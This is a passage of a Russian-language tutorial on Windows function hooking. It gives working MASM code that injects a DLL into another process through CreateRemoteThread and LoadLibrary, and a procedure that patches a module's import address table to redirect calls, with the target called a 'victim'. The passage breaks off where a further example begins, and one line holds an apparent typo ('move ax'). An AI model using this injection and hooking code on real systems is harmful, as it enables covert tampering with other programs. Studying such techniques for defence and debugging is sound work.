&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Автор: Bill Prisoner / TPOC &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;=======================================================</span><br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Options and Includes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: #ff0000;">.386</span><br />
option casemap<span style="color: #339933;">:</span>none<br />
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br />
include \tools\masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
includelib \tools\masm32\lib\kernel32<span style="color: #339933;">.</span>lib<br />
include \tools\masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \tools\masm32\include\user32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
includelib \tools\masm32\lib\user32<span style="color: #339933;">.</span>lib<br />
include \tools\masm32\include\advapi32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
includelib \tools\masm32\lib\advapi32<span style="color: #339933;">.</span>lib<br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Initialized Data Section</span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; lib <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;c:\\dll.dll&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;имя DLL, которую внедряем в чужой процесс &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; dwSize <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>lib<span style="color: black; font-style: italic;">;Размер строки с именем DLL </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; kernelName <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;kernel32.dll&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Имя Kernel32.dll</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; loadlibraryName <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;LoadLibraryA&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Имя функции LoadLibraryA</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; _LoadLibrary <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Адрес функции LoadLibrary &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; ParameterForLoadLibrary <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Адрес строки с именем DLL в чужом процессе </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; ThreadId <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;Идентификатор треда &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PID <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">1700</span><span style="color: black; font-style: italic;">;Идентификатор целевого процесса&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Uninitialized Data Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: #0000ff; font-weight: bold;">.data</span>?&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; hProcess <span style="color: #0000ff; font-weight: bold;">dd</span> ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Code Section&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br />
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; <span style="color: black; font-style: italic;">;Открываем процесс куда будем внедрять DLL</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke OpenProcess<span style="color: #339933;">,</span>PROCESS_CREATE_THREAD <span style="color: #00007f; font-weight: bold;">or</span> PROCESS_VM_WRITE <span style="color: #00007f; font-weight: bold;">or</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; PROCESS_VM_OPERATION<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>PID <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получаем описатель модуля Kernel32.dll</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset kernelName<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получаем адрес функции LoadLibrary</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset loadlibraryName<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _LoadLibrary<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Выделяем память в удаленном процессе</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualAllocEx<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>dwSize<span style="color: #339933;">,</span>MEM_RESERVE <span style="color: #00007f; font-weight: bold;">or</span> MEM_COMMIT<span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PAGE_READWRITE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ParameterForLoadLibrary<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Запись строки с именем DLL в АП чужого процесса</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset lib<span style="color: #339933;">,</span>dwSize<span style="color: #339933;">,</span>NULL<br />
&nbsp; &nbsp; <span style="color: black; font-style: italic;">;Создаем удаленный поток, который вызывает LoadLibrary, </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;тем самым внедряем DLL в адресное пространство чужого процесса. &nbsp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateRemoteThread<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>_LoadLibrary<span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ParameterForLoadLibrary<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>offset ThreadId<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke ExitProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
end <span style="color: #0000ff; font-weight: bold;">start</span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End Program</span><br />
<span style="color: black; font-style: italic;">;===============================================================================</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>После внедрения DLL вызывается DllMain с параметром DLL_PROCESS_ATTACH. Именно при обработке этого параметра мы устанавливаем перехватчик.</p>
<h3><a name="c46"></a>Способы перехвата функций</h3>
<h4><a name="c461"></a>Правка таблицы импорта</h4>
<p>При вызове Win32-приложением функции экспортируемой из другого модуля, например</p>
<p>CALL MessageBoxA,0</p>
<p>компилятор генерирует код следующего вида:</p>
<p>CALL X, где X - адрес переходника вида jmp dword ptr [Y], где Y - адрес адреса функции в IAT(Import Address Table), которую заполняет при загрузке модуля загрузчик. При особой настройке компилятора вызов может быть таким CALL DWORD PTR [Y]. Суть метода перехвата заключается в том, чтобы править значения, которые находятся по адресу Y, т.е. правка значений в таблице адресов импорта. Сначала мы сохраняем реальный адрес перехватываемой функции. Потом проходимся по IAT и правим этот реальный адрес на адрес нашего обработчика. Но править придется IAT всех модулей в данный момент загруженный в АП процесса, а также всех динамически подгружаемых. В первом случае необходимо решить задачу получения списка всех модулей загруженных в АП процесса. Во втором случае мы должны перехватывать функции LoadLibraryA, ; LoadLibraryW, LoadLibraryExA, LoadLibraryExW. Также необходимо сделать так, чтобы функция GetProcAddress возвращала адрес нашего перехватчика, если вдруг жертва захочет получить реальный адрес функции, которую мы перехватываем. Это можно делать двумя способами - перехватом GetProcAddress или правкой таблицы экспорта модуля, где находиться перехватываемая функция. У этого способа есть один очень большой недостаток - функции, которые не содержатся в таблице импорта, перехватываться не будут, если только мы не будем осуществлять перехват прямо при начальной загрузке процесса. Обычно перехват делается для процесса, который уже работает. Например, программа получает адрес функции с помощью GetProcAddress, а потом мы уже делаем перехват. Тогда программа минует наш обработчик и вызовет правильную функцию.</p>
<p>Сначала я опишу процедуру, которая правит IAT указанного одним из параметров модуля. Я назвал эту процедуру EdiIATLocal. Например, мы перехватываем функцию, адрес которой X. Тогда процедура EditIATLocal  анализирует таблицу импорта указанного модуля и если она встречает там адрес X, то функция меняет X на адрес нашего обработчика, который также передается как параметр функции.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">;Процедура EditIATLocal&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;Описание:</span><br />
<span style="color: black; font-style: italic;">;Перехват вызовов функций редактированием IAT в одном модуле</span><br />
<span style="color: black; font-style: italic;">;Вход: Address адрес внутри файла в памяти</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ModName - указатель на имя модуля, IAT которого мы будем править. Регистр </span><br />
<span style="color: black; font-style: italic;">; &nbsp; не важен.</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; Orig - адрес функции, которую перехватываем</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; New - адрес нашего обработчика</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ModHandle - описатель модуля, где находиться функция для перехвата. </span><br />
<span style="color: black; font-style: italic;">; &nbsp; Например, описатель KERNEL32.DLL</span><br />
<span style="color: black; font-style: italic;">;Выход: 1 - перехватили, 0 - не перехватили</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
EditIATLocal proc ModName<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> Orig<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> New<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> ModHandle<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL OldProtect<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
<span style="color: black; font-style: italic;">;Получаем адрес таблицы директорий</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>ModHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>sizeof IMAGE_FILE_HEADER&nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>DataDirectory<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br />
<span style="color: black; font-style: italic;">;Получаем адрес таблицы импорта</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">:</span>ptr IMAGE_DATA_DIRECTORY<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span>sizeof IMAGE_DATA_DIRECTORY<span style="color: black;">&#41;</span><span style="color: #339933;">*</span>IMAGE_DIRECTORY_ENTRY_IMPORT<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span>==<span style="color: #ff0000;">0</span> <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; move <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>FALSE<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><span style="color: black; font-style: italic;">;Нет таблицы импорта</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>ModHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">;В esi - адрес таблицы импорта</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>PTR IMAGE_IMPORT_DESCRIPTOR<br />
NextDLL<span style="color: #339933;">:</span><span style="color: black; font-style: italic;">;очередная запись в таблице импорта</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Name1==NULL<span style="color: black; font-style: italic;">;Конец таблицы импорта?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>FALSE<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Name1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>ModHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrcmpi<span style="color: #339933;">,</span>ModName<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: black; font-style: italic;">;тот ли это модуль?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">EAX</span>!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>sizeof IMAGE_IMPORT_DESCRIPTOR<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextDLL<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
<span style="color: black; font-style: italic;">;Если дошли до сюда, то нашли имя модуля</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>ModHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>FirstThunk<span style="color: black; font-style: italic;">;В EDI - IAT</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>PTR IMAGE_THUNK_DATA<br />
NextFunction<span style="color: #339933;">:</span><span style="color: black; font-style: italic;">;перебираем все импортируемые функции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>u1<span style="color: #339933;">.</span>Function==<span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;IAT закончилась</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>sizeof IMAGE_IMPORT_DESCRIPTOR<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextDLL<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>u1<span style="color: #339933;">.</span>Function<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF Orig==<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black; font-style: italic;">;Нашли!!!</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Разрешим запись на нужную страницу</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualProtect<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><span style="color: #339933;">,</span>PAGE_EXECUTE_READWRITE<span style="color: #339933;">,</span>ADDR OldProtect<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetCurrentProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>New<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Сменим адрес функции на адрес обработчика</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><span style="color: #339933;">,</span>NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Воостановим прежние аттрибуты</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualProtect<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><span style="color: #339933;">,</span>OldProtect<span style="color: #339933;">,</span>ADDR OldProtect<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>TRUE<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF&nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_THUNK_DATA<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextFunction<br />
EditIATLocal endp<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>А процедура EditIATGlobal правит IAT всех модулей процесса, в котором она вызывается. Мы вызываем ее в процедуре DllMain DLL, которую мы будет внедрять в адресное пространство процесса-жертвы. Она просто перечисляет все модули в адресном пространстве текущего процесса с помощью ToolHelp-функций, а потом последовательно вызывает для каждого модуля процедуру EditIATLocal, которую я описал чуть выше.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
